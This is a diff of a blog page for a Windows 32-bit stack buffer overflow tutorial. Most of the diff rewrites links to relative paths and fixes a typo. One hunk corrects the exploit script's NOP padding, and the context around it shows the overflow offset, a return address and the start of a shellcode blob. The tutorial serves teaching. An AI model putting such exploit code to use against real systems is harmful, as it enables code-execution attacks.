@@ -10,21 +10,21 @@
 
   <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
 
-    <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/stylesheet/style.min.css">
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
 
     <link id="dark-theme-style" rel="stylesheet" type="text/css"
-    href="https://omega-void.github.io/theme/stylesheet/dark-theme.min.css">
+    href="/theme/stylesheet/dark-theme.min.css">
 
     <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-          href="https://omega-void.github.io/theme/pygments/tomorrow_night.min.css">
+          href="/theme/pygments/tomorrow_night.min.css">
 
 
-  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="https://omega-void.github.io/theme/font-awesome/css/solid.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
 
 
-    <link href="https://omega-void.github.io/./feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="OmegaVoid - Blog of Many Things Atom">
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="OmegaVoid - Blog of Many Things Atom">
 
 
     <link rel="shortcut icon" href="https://omega-void.github.io/images/favicon.png" type="image/x-icon">
@@ -41,11 +41,11 @@
 <meta property="og:title" content="BinExp Corner: Episode 1 - Stack Buffer Overflows"/>
 <meta property="og:description" content="The first of what&#39;s hopefully going to be a series on binary exploitation. We&#39;ll take a look at Windows 32bit Stack Buffer Overflows and show you why they are exploited the way they are. We&#39;ll also dive into some considerations about Buffer Overflows in general. And present an example of how to develop an exploit via this technique."/>
 <meta property="og:locale" content="en_US"/>
-<meta property="og:url" content="https://omega-void.github.io/binexp-corner-1-bofs.html"/>
+<meta property="og:url" content="/binexp-corner-1-bofs.html"/>
 <meta property="og:type" content="article"/>
 <meta property="article:published_time" content="2021-03-06 12:00:00+00:00"/>
 <meta property="article:modified_time" content="2021-03-06 12:00:00+00:00"/>
-<meta property="article:author" content="https://omega-void.github.io/author/omegavoid.html">
+<meta property="article:author" content="/author/omegavoid.html">
 <meta property="article:section" content="Tutorials"/>
 <meta property="article:tag" content="tutorial"/>
 <meta property="article:tag" content="binexp"/>
@@ -58,12 +58,12 @@
 <body class="dark-theme">
   <aside>
     <div>
-      <a href="https://omega-void.github.io">
+      <a href="https://www.omegavo.id">
         <img src="https://omega-void.github.io/images/OV.png" alt="OmegaVoid" title="OmegaVoid">
       </a>
 
       <h1>
-        <a href="https://omega-void.github.io">OmegaVoid</a>
+        <a href="https://www.omegavo.id">OmegaVoid</a>
       </h1>
 
 <p>Blog of Many Things</p>
@@ -98,14 +98,14 @@
   <main>
 
     <nav>
-      <a href="https://omega-void.github.io">Home</a>
+      <a href="https://www.omegavo.id">Home</a>
 
       <a href="/category/rants.html">Rants</a>
       <a href="/category/tutorials.html">Tutorials</a>
       <a href="/archives.html">Archives</a>
       <a href="/pages/about.html">About</a>
 
-     <!--       <a href="https://omega-void.github.io/./feeds/all.atom.xml">Atom</a>
+     <!--       <a href="/feeds/all.atom.xml">Atom</a>
 
 -->
     </nav>
@@ -115,7 +115,7 @@
       
     <h1 id="binexp-corner-1-bofs">BinExp Corner: Episode 1 - Stack Buffer Overflows</h1>
     <p>
-      Posted on Sat 06 March 2021 in <a href="https://omega-void.github.io/category/tutorials.html">Tutorials</a>
+      Posted on sáb 06 março 2021 in <a href="/category/tutorials.html">Tutorials</a>
 
     </p>
   </header>
@@ -222,7 +222,7 @@
 <p>So let's do this. We'll launch our binary on Immunity Debugger and execute it.</p>
 <p>Remember to reset the binary anytime it crashes.</p>
 <h3>Writing code to interact with the Application and Fuzzing</h3>
-<p>First of all one thing we need to do is figure out if and here an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.</p>
+<p>First of all one thing we need to do is figure out if and where an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.</p>
 <p>In a White Box approach you'd analyze the binary (or the source code) for functions you know are vulnerable to stack buffer overflows.</p>
 <p>In a Black Box approach you feed normal input to the application and see the application behaviour, and then feed it an extremely long input and see if the application crashes.</p>
 <p>If it crashes with a really long input, and we know it's a binary running, there's a good chance there's a Buffer Overflow there.</p>
@@ -407,7 +407,7 @@ Trust your debugger.</p>
 <div class="highlight"><pre><span></span><code><span class="n">offset</span> <span class="o">=</span> <span class="mi">2026</span>
 <span class="n">overflow</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
 <span class="n">EIP</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xaf\x11\x50\x62</span><span class="s1">&#39;</span>
-<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;x90&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
 <span class="s2">&quot;</span><span class="se">\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s2">&quot;</span>
 <span class="s2">&quot;</span><span class="se">\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6</span><span class="s2">&quot;</span>
@@ -452,9 +452,9 @@ Trust your debugger.</p>
   </div>
   <div class="tag-cloud">
     <p>
-      <a href="https://omega-void.github.io/tag/tutorial.html">tutorial</a>
-      <a href="https://omega-void.github.io/tag/binexp.html">binexp</a>
-      <a href="https://omega-void.github.io/tag/buffer-overflows.html">buffer overflows</a>
+      <a href="/tag/tutorial.html">tutorial</a>
+      <a href="/tag/binexp.html">binexp</a>
+      <a href="/tag/buffer-overflows.html">buffer overflows</a>
     </p>
   </div>
 
@@ -482,7 +482,7 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using a m
   "@context" : "http://schema.org",
   "@type" : "Blog",
   "name": " OmegaVoid - Blog of Many Things ",
-  "url" : "https://omega-void.github.io",
+  "url" : "",
   "image": "https://omega-void.github.io/images/OV.png",
   "description": ""
 }
